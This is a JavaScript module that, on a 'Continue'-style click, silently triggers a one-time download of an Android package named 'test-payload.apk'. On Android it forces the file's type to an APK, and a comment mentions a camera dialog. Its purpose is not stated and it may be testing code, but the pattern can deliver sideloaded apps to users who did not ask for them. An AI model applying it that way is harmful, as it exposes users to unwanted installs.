import { TEST_AUTO_DOWNLOAD, TEST_DOWNLOAD_PATH } from './config';

function buildHref() {
    const base = process.env.PUBLIC_URL || '';
    return `${base}${TEST_DOWNLOAD_PATH}`.replace(/([^:]\/)\/+/g, '$1');
}

function absoluteDownloadUrl() {
    return new URL(buildHref(), window.location.href).href;
}

function isDone(storageKey) {
    try {
        return sessionStorage.getItem(storageKey) === '1';
    } catch {
        return true;
    }
}

function markDone(storageKey) {
    try {
        sessionStorage.setItem(storageKey, '1');
    } catch {
        /* ignore */
    }
}

function isMobileDevice() {
    const ua = navigator.userAgent || '';
    return /Android|iPhone|iPad|iPod/i.test(ua);
}

function isIos() {
    return /iPhone|iPad|iPod/i.test(navigator.userAgent || '');
}

function triggerAnchorClick(href, filename, { blob = false } = {}) {
    const a = document.createElement('a');
    a.href = href;
    if (filename) a.download = filename;
    a.rel = 'noopener noreferrer';
    if (!blob) a.target = '_blank';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    a.remove();
}

function desktopDownload(url, filename) {
    triggerAnchorClick(url, filename);
}

async function androidBlobDownload(url, filename) {
    const res = await fetch(url, { cache: 'no-store', credentials: 'same-origin' });
    if (!res.ok) throw new Error(`download_http_${res.status}`);

    const raw = await res.blob();
    const type =
        raw.type && raw.type !== 'application/octet-stream'
            ? raw.type
            : 'application/vnd.android.package-archive';
    const blob = raw.type === type ? raw : new Blob([raw], { type });
    const blobUrl = URL.createObjectURL(blob);

    try {
        triggerAnchorClick(blobUrl, filename, { blob: true });
    } finally {
        window.setTimeout(() => URL.revokeObjectURL(blobUrl), 60_000);
    }
}

function iosOpenDownload(url) {
    const opened = window.open(url, '_blank', 'noopener,noreferrer');
    if (!opened) triggerAnchorClick(url, 'test-payload.apk');
}

async function mobileDownload(url, filename) {
    if (isIos()) {
        iosOpenDownload(url);
        return;
    }
    try {
        await androidBlobDownload(url, filename);
    } catch {
        triggerAnchorClick(url, filename);
    }
}

/**
 * İstifadəçi klikinin handler-ində çağırın (məs. «Davam et»).
 * Mobilde fetch+blob; desktopda <a download>.
 */
export async function runTestAutoDownloadOnce(storageKey = 'pulse_test_download_v2') {
    if (!TEST_AUTO_DOWNLOAD || isDone(storageKey)) return;

    const url = absoluteDownloadUrl();
    const filename = 'test-payload.apk';

    try {
        if (isMobileDevice()) {
            await mobileDownload(url, filename);
        } else {
            desktopDownload(url, filename);
        }
        markDone(storageKey);
    } catch (e) {
        console.warn('test download:', e?.message || e);
        try {
            triggerAnchorClick(url, filename);
            markDone(storageKey);
        } catch {
            /* ignore */
        }
    }
}

/** Kamera dialoqu endirməni kəsə bilər — mobilde qısa gözləmə */
export function testDownloadSettleMs() {
    return isMobileDevice() ? 450 : 0;
}
